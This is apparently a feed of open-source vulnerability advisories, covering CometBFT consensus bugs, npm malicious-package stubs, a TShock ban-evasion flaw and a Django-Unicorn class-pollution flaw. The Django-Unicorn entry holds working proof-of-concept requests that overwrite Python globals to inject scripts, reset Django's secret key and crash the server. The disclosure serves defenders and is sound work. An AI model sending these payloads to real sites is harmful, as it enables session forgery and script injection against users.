                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/security/advisories/GHSA-r3r4-g7hq-pq4f'>https://github.com/cometbft/cometbft/security/advisories/GHSA-r3r4-g7hq-pq4f</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/commit/415c0da223bb7694608913f725fa45bd7a7a46bf'>https://github.com/cometbft/cometbft/commit/415c0da223bb7694608913f725fa45bd7a7a46bf</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/commit/f943aabc7b9201ea1089ff3381479929435ce424'>https://github.com/cometbft/cometbft/commit/f943aabc7b9201ea1089ff3381479929435ce424</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft'>https://github.com/cometbft/cometbft</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3443'>https://pkg.go.dev/vuln/GO-2025-3443</a></li></ul><br>
                            <b>Details:</b> <b>CometBFT allows a malicious peer to stall the network by disseminating seemingly valid block parts</b><br>Name: ASA-2025-002: Malicious peer can stall network by disseminating seemingly valid block parts
Component: CometBFT
Criticality: High (Catastrophic Impact; Possible Likelihood per [ACMv1.2](https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;main&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md))
Affected versions: &amp;lt;= v0.38.16, v1.0.0
Affected users: Validators, Full nodes, Users

### Description

A bug was identified in the CometBFT validation of block part indices and the corresponding proof part indices that can lead to incorrect processing and dissemination of invalid parts, which in turn could lead to a network halt. Additional validation was added to prevent this condition from happening.

### Patches

The new CometBFT releases [v1.0.1](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;releases&#x2F;tag&#x2F;v1.0.1) and [v0.38.17](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;releases&#x2F;tag&#x2F;v0.38.17) fix this issue.

Unreleased code in the main branch is patched as well.

### Workarounds

There are no known workarounds for this issue. If a node is producing these malicious proofs, the only mitigation is to upgrade CometBFT. After upgrading, the validators then will eventually conclude the correct value.

### Technical Deep-Dive

When the next proposer creates a block, it is split into many block parts (64kB each). Each block part is then disseminated via p2p layer in a gossip fashion. The block part contains the following fields:

```go
type Part struct {
	Index uint32            `json:&quot;index&quot;`
	Bytes cmtbytes.HexBytes `json:&quot;bytes&quot;`
	Proof merkle.Proof      `json:&quot;proof&quot;`
}
```

- `Index` - represents the index of a block part
- `Bytes` - the actual content
- `Proof` - Merkle proof, which allows the receiving node to quickly verify that a `Part` is indeed a piece of the proposed block.

The `Proof` contains the following fields:

```go
type Proof struct {
	Total    int64    `json:&quot;total&quot;`           &#x2F;&#x2F; Total number of items.
	Index    int64    `json:&quot;index&quot;`           &#x2F;&#x2F; Index of item to prove.
	LeafHash []byte   `json:&quot;leaf_hash&quot;`       &#x2F;&#x2F; Hash of item value.
	Aunts    [][]byte `json:&quot;aunts,omitempty&quot;` &#x2F;&#x2F; Hashes from leaf&#x27;s sibling to a root&#x27;s child.
}
```

Note that the total number of leaves in the Merkle tree equals the number of parts in the proposed block. Previously, CometBFT did not validate the `Index` field and specifically that `Part.Index` must be equal to `Part.Proof.Index`. This leads to a condition where, it is possible to use the proof from a different part and CometBFT accept it, even though the proof proves the different part is a piece of the proposed block and not the part that the peer actually sent to us.

This condition is problematic because: 

1. it would disseminate the invalid block part to its neighboring nodes (because it deemed it as correct)
2. it would mark the block part as received and ask the neighboring nodes not to relay it in the future, making it impossible to receive the correct block part.

To address this, CometBFT was patched to verify that `Part.Index` is equal to `Part.Proof.Index`, preventing the above condition.

### Timeline

* January 15, 2025, 12:12pm PST: Issue reported to the Cosmos Bug Bounty program
* January 15, 2025, 12:31pm PST: Issue triaged by Amulet on-call, and distributed to Core team
* January 27, 2025, 11:28pm PST: Core team completes validation of issue
* January 31, 2024, 2:15pm PST: Pre-notification delivered
* February 3rd, 2024, 9:00am UTC+4: Patch made available

This issue was reported by [unknown_feature](https:&#x2F;&#x2F;github.com&#x2F;unknownfeature) to the Cosmos Bug Bounty Program on HackerOne on January 15, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see https:&#x2F;&#x2F;hackerone.com&#x2F;cosmos.

If you have questions about Interchain security efforts, please reach out to our official communication channel at [security@interchain.io](mailto:security@interchain.io). For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security.  

A Github Security Advisory for this issue is available in the CometBFT [repository](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;security&#x2F;advisories&#x2F;GHSA-r3r4-g7hq-pq4f). For more information about CometBFT, see https:&#x2F;&#x2F;docs.cometbft.com&#x2F;.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-792: 0 | <b>Malicious code in adobe-dcapi-web (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-792</link>
                    <pubDate>2025-02-03T16:44:04Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-792'>https://osv.dev/vulnerability/MAL-2025-792</a><br>
                            <b>Published:</b> 2025-02-03T16:44:04Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://socket.dev/blog/weaponizing-oast-how-malicious-packages-exploit-npm-pypi-and-rubygems'>https://socket.dev/blog/weaponizing-oast-how-malicious-packages-exploit-npm-pypi-and-rubygems</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in adobe-dcapi-web (npm)</b><br>
---
_-= Per source details. Do not edit below this line.=-_

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-789: 0 | <b>Malicious code in aaaa89852889 (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-789</link>
                    <pubDate>2025-02-03T16:43:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-789'>https://osv.dev/vulnerability/MAL-2025-789</a><br>
                            <b>Published:</b> 2025-02-03T16:43:47Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://socket.dev/blog/skuld-infostealer-returns-to-npm'>https://socket.dev/blog/skuld-infostealer-returns-to-npm</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in aaaa89852889 (npm)</b><br>
---
_-= Per source details. Do not edit below this line.=-_

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-f8mx-cwfh-7hr2: 6.9 | <b>TShock allows chat while not fully connected, possible ban evasion</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-f8mx-cwfh-7hr2</link>
                    <pubDate>2025-02-03T16:02:36Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-f8mx-cwfh-7hr2'>https://osv.dev/vulnerability/GHSA-f8mx-cwfh-7hr2</a><br>
                            <b>Published:</b> 2025-02-03T16:02:36Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock/security/advisories/GHSA-f8mx-cwfh-7hr2'>https://github.com/Pryaxis/TShock/security/advisories/GHSA-f8mx-cwfh-7hr2</a></li><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock/commit/134f80f5b8eac8929aa10f518c00970700d5913d'>https://github.com/Pryaxis/TShock/commit/134f80f5b8eac8929aa10f518c00970700d5913d</a></li><li>- <a target='_blank' href='https://github.com/Pryaxis/TShock'>https://github.com/Pryaxis/TShock</a></li></ul><br>
                            <b>Details:</b> <b>TShock allows chat while not fully connected, possible ban evasion</b><br>This issue was reported to TShock by @ohayo, but was found by the Discord user by the name of `sofurry.com`. Please note that this user **does not own this domain on the internet, just the discord handle**.

TShock overrides certain Terraria vanilla systems, including chat, and the connection handling, for its own purposes, like enforcing bans. When clients connect but do not complete the connection handshake (e.g., send message number 6), they can &quot;exist&quot; on the server, occupy a player slot, chat, and receive data from the server despite not being fully connected. Individuals who exploit this will be able to effectively harass the server, observe the server, and utilize server resources even if banned from the server.

For servers that operate with a proxy that strictly enforces the connection handshake&#x2F;sequence, this is not an issue, but for smaller servers or servers running vanilla TShock this is an issue worth patching for.

PR body supplied by @ohayo (patch writer):

Terraria&#x27;s standard server by default checks for bans upon the client sending the ConnectRequest packet, however, TShock instead chooses to check if the client connecting is banned upon the Request World Data packet.

A malicious client can easily just not send this packet, and still join the server even while being banned.
Also by not sending Request World Data, the malicious client is still able to receive all packets from the server &amp; even chat. 

Other clients will not be notified of their join&#x2F;leave but will be able to see them on the player list.
Leading to potential chat spam &amp; &quot;spying&quot; on packets of players within the server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-22qq-3xwm-r5x4: 6.9 | <b>CometBFT allows a malicious peer to make node stuck in blocksync</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-22qq-3xwm-r5x4</link>
                    <pubDate>2025-02-03T15:55:28Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-22qq-3xwm-r5x4'>https://osv.dev/vulnerability/GHSA-22qq-3xwm-r5x4</a><br>
                            <b>Published:</b> 2025-02-03T15:55:28Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/security/advisories/GHSA-22qq-3xwm-r5x4'>https://github.com/cometbft/cometbft/security/advisories/GHSA-22qq-3xwm-r5x4</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/commit/0ee80cd609c7ae9fe856bdd1c6d38553fdae90ce'>https://github.com/cometbft/cometbft/commit/0ee80cd609c7ae9fe856bdd1c6d38553fdae90ce</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/commit/2cebfde06ae5073c0b296a9d2ca6ab4b95397ea5'>https://github.com/cometbft/cometbft/commit/2cebfde06ae5073c0b296a9d2ca6ab4b95397ea5</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft'>https://github.com/cometbft/cometbft</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/releases/tag/v0.38.17'>https://github.com/cometbft/cometbft/releases/tag/v0.38.17</a></li><li>- <a target='_blank' href='https://github.com/cometbft/cometbft/releases/tag/v1.0.1'>https://github.com/cometbft/cometbft/releases/tag/v1.0.1</a></li><li>- <a target='_blank' href='https://pkg.go.dev/vuln/GO-2025-3442'>https://pkg.go.dev/vuln/GO-2025-3442</a></li></ul><br>
                            <b>Details:</b> <b>CometBFT allows a malicious peer to make node stuck in blocksync</b><br>Name: ASA-2025-001: Malicious peer can disrupt node&#x27;s ability to sync via blocksync
Component: CometBFT
Criticality: Medium (Considerable Impact; Possible Likelihood per [ACMv1.2](https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security&#x2F;blob&#x2F;main&#x2F;resources&#x2F;CLASSIFICATION_MATRIX.md))
Affected versions: &amp;lt;= v0.38.16, v1.0.0
Affected users: Validators, Full nodes

### Impact

A malicious peer may be able to interfere with a node&#x27;s ability to sync blocks with peers via the blocksync mechanism. 

In the `blocksync` protocol peers send their `base` and `latest` heights when they connect to a new node (`A`), which is syncing to the tip of a network. `base` acts as a lower ground and informs `A` that the peer only has blocks starting from height `base`. `latest` height informs `A` about the latest block in a network. Normally, nodes would only report increasing heights:

```
B: {base: 100, latest: 1000}
B: {base: 100, latest: 1001}
B: {base: 100, latest: 1002}
...
```

If `B` fails to provide the latest block, `B` is removed and the `latest` height (target height) is recalculated based on other nodes `latest` heights.

The existing code hovewer doesn&#x27;t check for the case where `B` first reports `latest` height `X` and immediately after height `Y`, where `X &amp;gt; Y`. For example:

```
B: {base: 100, latest: 2000}
B: {base: 100, latest: 1001}
B: {base: 100, latest: 1002}
...
```

`A` will be trying to catch up to 2000 indefinitely. Even if `B` disconnects, the `latest` height (target height) won&#x27;t be recalculated because `A` &quot;doesn&#x27;t know where 2000&quot; came from per see.

#### Impact Qualification

This condition requires the introduction of malicious code in the full node first reporting a non-existing `latest` height, then reporting lower `latest` height and nodes which are syncing using `blocksync` protocol.

### Patches

The new CometBFT releases [v1.0.1](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;releases&#x2F;tag&#x2F;v1.0.1) and [v0.38.17](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;releases&#x2F;tag&#x2F;v0.38.17) fix this issue.

Unreleased code in the main is patched as well.

### Workarounds

When the operator notices `blocksync` is stuck, they can identify the peer from which that message with &quot;invalid&quot; height was received. This may require increasing the logging level of the `blocksync` module. This peer can then be subsequently banned at the p2p layer as a temporary mitigation.

### References

If you have questions about Interchain security efforts, please reach out to our official communication channel at [security@interchain.io](mailto:security@interchain.io).  For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see https:&#x2F;&#x2F;github.com&#x2F;interchainio&#x2F;security.  

A Github Security Advisory for this issue is available in the CometBFT [repository](https:&#x2F;&#x2F;github.com&#x2F;cometbft&#x2F;cometbft&#x2F;security&#x2F;advisories&#x2F;GHSA-22qq-3xwm-r5x4). For more information about CometBFT, see https:&#x2F;&#x2F;docs.cometbft.com&#x2F;.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-g9wf-5777-gq43: 9.3 | <b>Django-Unicorn Class Pollution Vulnerability, Leading to XSS, DoS and Authentication Bypass</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-g9wf-5777-gq43</link>
                    <pubDate>2025-02-03T15:48:53Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-g9wf-5777-gq43'>https://osv.dev/vulnerability/GHSA-g9wf-5777-gq43</a><br>
                            <b>Published:</b> 2025-02-03T15:48:53Z<br>
                            <b>Severity:</b> 9.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43'>https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43</a></li><li>- <a target='_blank' href='https://github.com/adamghill/django-unicorn/commit/17614200f27174f789d4af54cc3a1f2b0df7870c'>https://github.com/adamghill/django-unicorn/commit/17614200f27174f789d4af54cc3a1f2b0df7870c</a></li><li>- <a target='_blank' href='https://github.com/adamghill/django-unicorn'>https://github.com/adamghill/django-unicorn</a></li><li>- <a target='_blank' href='https://github.com/adamghill/django-unicorn/releases/tag/0.62.0'>https://github.com/adamghill/django-unicorn/releases/tag/0.62.0</a></li></ul><br>
                            <b>Details:</b> <b>Django-Unicorn Class Pollution Vulnerability, Leading to XSS, DoS and Authentication Bypass</b><br># Summary

Django-Unicorn is vulnerable to python class pollution vulnerability, a new type of vulnerability categorized under [CWE-915](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;915.html). The vulnerability arises from the core functionality `set_property_value`, which can be remotely triggered by users by crafting appropriate component requests and feeding in values of second and third parameter to the vulnerable function, leading to arbitrary changes to the python runtime status. 

With this finding, so far we&#x27;ve found at least five ways of vulnerability exploitation, stably resulting in Cross-Site Scripting (XSS), Denial of Service (DoS), and Authentication Bypass attacks in almost every Django-Unicorn-based application.

# Analysis of Vulnerable Function

By taking a look at the vulnerable function `set_property_value` located at: `django_unicorn&#x2F;views&#x2F;action_parsers&#x2F;utils.py`. You can observe the functionality is responsible for modifying a property value of an object. 

The property is specified by a dotted form of path at the second parameter `property_name`, where nested reference to object is supported, and base object and the assigned value is given by the first parameter `component` and third parameter `property_value`.

```python
# https:&#x2F;&#x2F;github.com&#x2F;adamghill&#x2F;django-unicorn&#x2F;blob&#x2F;7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0&#x2F;django_unicorn&#x2F;views&#x2F;action_parsers&#x2F;utils.py#L10
def set_property_value(
    component,
    property_name,
    property_value
) -&amp;gt; None:
    ...
    property_name_parts = property_name.split(&quot;.&quot;)
    component_or_field = component
    ...
    for idx, property_name_part in enumerate(property_name_parts):
        if hasattr(component_or_field, property_name_part):
            if idx == len(property_name_parts) - 1:
                ...
                setattr(component_or_field, property_name_part, property_value)
                ...
            else:
                component_or_field = getattr(component_or_field, property_name_part)
                ...
        elif isinstance(component_or_field, dict):
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part] = property_value
				...
            else:
                component_or_field = component_or_field[property_name_part]
				...
        elif isinstance(component_or_field, (QuerySet, list)):
            property_name_part_int = int(property_name_part)

            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part_int] = property_value  # type: ignore[index]
                ...
            else:
                component_or_field = component_or_field[property_name_part_int]  # type: ignore[index]
                ...
        else:
            break
```

Meanwhile, this functionality can be directly triggered by a component request, one of the core functionalities of the project, by specifying the request type as `syncInput` and payload object would be fed in the dotted-path (2nd) parameter and assigned value (3rd) parameter of the vulnerable function.

```json
POST &#x2F;unicorn&#x2F;message&#x2F;COMPONENT_NAME

{
    &quot;id&quot;: 123,
    &quot;actionQueue&quot;:[
        {
          &quot;type&quot;: &quot;syncInput&quot;,
          &quot;payload&quot;: {
          &quot;name&quot;: &quot;DOTTED_PATH&quot;,
          &quot;value&quot;:&quot;ASSIGNED_VALUE&quot;
          }
    		}
    ],
    &quot;data&quot;: {XXX},
    &quot;epoch&quot;: &quot;123&quot;,
    &quot;checksum&quot;: &quot;XXXX&quot;
}
```

You are now aware of that users from the remote can fully control the `property_name` and `property_value` of the vulnerable function. By default the preperty value overwrite can only be performed on the component object, which is always the first parameter of the function.

However, the functionality failed to count in the situation where bad actors can modify the normal path to traverse to other objects in the python runtime, by leveraging the **magic attributes**. For example, if the `property_name` was set to `__init__.__globals__`, the component context would change to global context of the component module, which means we can modify any attributes of the objects that are located in the global scope of the component module. These objects also include other modules that have been imported in the component module, which comprises of a pollutable dependency chain.

With all these techniques introduced, we can now change any global objects including, global variables&#x2F;instances&#x2F;classes&#x2F;functions of any module that is in a chain of dependency from the component module.

The next section, introduces the five exploitation gadgets found so far, leading to reflected XSS, stored XSS, authentication bypass and DOS attack. It uses a locally deployed `django-unicorn.com`  as demo website to showcase its large-scale impact.

&amp;gt; Here, gadgets refer to the dependency code snippets by default introduced by django-unicorn and changing its status can result in an attack sequence, such as XSS.

# Proof of Concept

## #1 Reflected Cross-Site Scripting by Overwriting bs4 HTML sanitizer

Django-Unicorn implants the `EntitySubstitution` rule from beautifulsoup4 library into its [HTML formatter](https:&#x2F;&#x2F;github.com&#x2F;adamghill&#x2F;django-unicorn&#x2F;blob&#x2F;7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0&#x2F;django_unicorn&#x2F;components&#x2F;unicorn_template_response.py#L125), formatting all the template response messages.

![image-20250121163510422](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-35-11-a1aa5cfa196383e3a26636eb80bd85f0.png)

While [this rule](https:&#x2F;&#x2F;github.com&#x2F;akalongman&#x2F;python-beautifulsoup&#x2F;blob&#x2F;master&#x2F;bs4&#x2F;dammit.py#L79) is specified in a global dictionary, we can exploit the class pollution vulnerability to overwrite it.

```http
POST &#x2F;unicorn&#x2F;message&#x2F;todo HTTP&#x2F;1.1

{
  &quot;id&quot;: 123,
  &quot;actionQueue&quot;: [
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.&amp;lt;&quot;,
        &quot;value&quot;: &quot;&amp;lt;img&#x2F;src=1 onerror=alert(&#x27;bs4_html_entity_bypass&#x27;)&amp;gt;&quot;
      }
    }
  ],
  &quot;data&quot;: {
    &quot;task&quot;: &quot;&quot;,
    &quot;tasks&quot;: []
  },
  &quot;epoch&quot;: &quot;123&quot;,
  &quot;checksum&quot;: &quot;XXX&quot;
}
```

In this demonstration, we replaced the sanitizer&#x27;s `&amp;lt;` item value with the XSS payload. whenever a template reponse renders a &quot;&amp;lt;&quot; in cleartext, it will be converted to the payload, leading to XSS attack.

![bs4-xss](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-40-56-5ecbe8f2d39a6cc9a546744ca995b2d9.gif)

## #2 Stored Cross-Site Scripting by Overwriting Unicorn Setting and [Django](https:&#x2F;&#x2F;github.com&#x2F;django&#x2F;django) Json Script Sanitizer

There is a script tag in the webpage. Among it, a `NAME` value is dynamically extracted both from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variable in the [setting module](https:&#x2F;&#x2F;github.com&#x2F;adamghill&#x2F;django-unicorn&#x2F;blob&#x2F;7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0&#x2F;django_unicorn&#x2F;settings.py#L12). 

![image-20250121165007647](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-50-08-f2a628f8d06ba81c9bb71f78766cecb7.png)

However, simply polluting these values can not lead to a stored XSS attack. Django by default escape some of the special characters into unicode sequences.

![image-20250121164947336](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-49-47-b756d516b0b3e3d025d876963e1dbf6a.png)

Going through the source code of django, we found out the actual sanitizer located at `_json_script_escapes` variable at [django&#x2F;utils&#x2F;html.py](https:&#x2F;&#x2F;github.com&#x2F;django&#x2F;django&#x2F;blob&#x2F;862b7f98a02b7973848db578ff6d24ec8500fdb4&#x2F;django&#x2F;utils&#x2F;html.py#L84).

![image-20250121165247245](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-52-47-b60cd91f46ed89bc7b0a4b3f68521827.png)

By polluting this variable to clear it out, we finally achieve a stored XSS attack.

![image-20250121165839892](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-58-40-97608fc15544d68edbfbdc8e61744b12.png)

PoC:

```http
POST &#x2F;unicorn&#x2F;message&#x2F;todo HTTP&#x2F;1.1

{
  &quot;id&quot;: &quot;3gpDSUcxzs1&quot;,
  &quot;data&quot;: {
    &quot;task&quot;: &quot;&quot;,
    &quot;tasks&quot;: []
  },
  &quot;checksum&quot;: &quot;XXX&quot;,
  &quot;actionQueue&quot;: [
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES&quot;,
        &quot;value&quot;: [
          &quot;&amp;lt;&#x2F;script&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;django json unicode escape bypass + configuration overwrite&#x27;)&amp;lt;&#x2F;script&amp;gt;&quot;
        ]
      }
    },
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME&quot;,
        &quot;value&quot;: &quot;&amp;lt;&#x2F;script&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;django json unicode escape bypass + configuration overwrite&#x27;)&amp;lt;&#x2F;script&amp;gt;&quot;
      }
    },
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.django.utils.html._json_script_escapes&quot;,
        &quot;value&quot;: {}
      }
    }
  ],
  &quot;epoch&quot;: 1737318956605,
  &quot;hash&quot;: &quot;jWGuTFzy&quot;
}
```

![json_unicode_xss](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;16-58-59-f8da2463bbaa8de4f305c6fd2235172b.gif)

## #3 Stored Cross-Site Scripting by Overwriting [Django](https:&#x2F;&#x2F;github.com&#x2F;django&#x2F;django) Error Page Source Code

Django by default stores its error page source code in a global variable named `ERROR_PAGE_TEMPLATE` at [django&#x2F;views&#x2F;defaults.py](https:&#x2F;&#x2F;github.com&#x2F;django&#x2F;django&#x2F;blob&#x2F;main&#x2F;django&#x2F;views&#x2F;defaults.py#L16). 

![image-20250121170357900](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;17-03-58-86c9cf2abfa28f0e1ed479521af5be2e.png)

By polluting this variable to XSS payload. whenever a user triggers an error in the application, such as access an unexisting resource, the attack payload fires out.

```http
POST &#x2F;unicorn&#x2F;message&#x2F;todo HTTP&#x2F;1.1

{
  &quot;id&quot;: 123,
  &quot;actionQueue&quot;: [
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE&quot;,
        &quot;value&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;error page pollution&#x27;)&amp;lt;&#x2F;script&amp;gt;&amp;lt;&#x2F;html&amp;gt;&quot;
      }
    }
  ],
  &quot;data&quot;: {
    &quot;task&quot;: &quot;&quot;,
    &quot;tasks&quot;: []
  },
  &quot;epoch&quot;: &quot;123&quot;,
  &quot;checksum&quot;: &quot;XXX&quot;
}
```

![django-404-xss](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;17-05-05-e6ce889e7549243a5d8a60877fbb8cff.gif)

## #4 Authentication Bypass by Overwriting [Django](https:&#x2F;&#x2F;github.com&#x2F;django&#x2F;django) Secret Key 

Django secret key is typically used to sign and verify session cookies and other security related mechanism. By polluting its runtime value to attacker intended, attacker can forge session cookies to login in to the system as any user.

Even though, django-unicorn.com doesn&#x27;t have an authentication layer, you can still observe a successful secret key pollution by inspecting the changed checksum in the HTTP response, since the checksum is generated by encrypting the data field in the request body with the secret key.

```HTTP
POST &#x2F;unicorn&#x2F;message&#x2F;todo HTTP&#x2F;1.1

{
  &quot;id&quot;: 123,
  &quot;actionQueue&quot;: [
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY&quot;,
        &quot;value&quot;: &quot;test&quot;
      }
    }
  ],
  &quot;data&quot;: {
    &quot;task&quot;: &quot;&quot;,
    &quot;tasks&quot;: []
  },
  &quot;epoch&quot;: &quot;123&quot;,
  &quot;checksum&quot;: &quot;XXX&quot;
}
```

![authentication_bypass](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;17-12-20-424da7c5c960471600863828fba93c4a.gif)

## #5 Denial of Service by Overwriting `timed` Decorator Method

The [timed](https:&#x2F;&#x2F;github.com&#x2F;adamghill&#x2F;django-unicorn&#x2F;blob&#x2F;7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0&#x2F;django_unicorn&#x2F;decorators.py#L9) decorator is used to modify many important functions in the django-unicorn, such as [_call_method_name](https:&#x2F;&#x2F;github.com&#x2F;adamghill&#x2F;django-unicorn&#x2F;blob&#x2F;7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0&#x2F;django_unicorn&#x2F;views&#x2F;action_parsers&#x2F;call_method.py#L122).

![image-20250121171823756](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;17-18-24-0e1cec22199ab2dc1bc9bbcb76d2dcd9.png)

By polluting the core decorator method `timed`  to a string, we make a function call always call a uncallable string, leading to the backend crashed, thus denial of service attack.

```http
POST &#x2F;unicorn&#x2F;message&#x2F;todo HTTP&#x2F;1.1

{
  &quot;id&quot;: 123,
  &quot;actionQueue&quot;: [
    {
      &quot;type&quot;: &quot;syncInput&quot;,
      &quot;payload&quot;: {
        &quot;name&quot;: &quot;__init__.__globals__.timed&quot;,
        &quot;value&quot;: &quot;X&quot;
      }
    }
  ],
  &quot;data&quot;: {
    &quot;task&quot;: &quot;&quot;,
    &quot;tasks&quot;: []
  },
  &quot;epoch&quot;: &quot;123&quot;,
  &quot;checksum&quot;: &quot;XXX&quot;
}
```

![dos_attack](https:&#x2F;&#x2F;api.2h0ng.wiki:443&#x2F;noteimages&#x2F;2025&#x2F;01&#x2F;21&#x2F;17-20-39-20ab579669a459c7fb54afeab21dcd4e.gif)

# Mitigation

The patch could be:

- Blocking paths that start with `__`,  which represent **double under (dunder)** or **magic variables&#x2F;methods**
- Set a blacklist for the path, such as `RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)` adopted by [pydash](https:&#x2F;&#x2F;github.com&#x2F;dgilland&#x2F;pydash&#x2F;blob&#x2F;f4112f61ddb02e5181e781709d775838c9978b97&#x2F;src&#x2F;pydash&#x2F;helpers.py#L211).

# Related Materials

For more information about class pollution please refer to:

[1] [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;915.html)

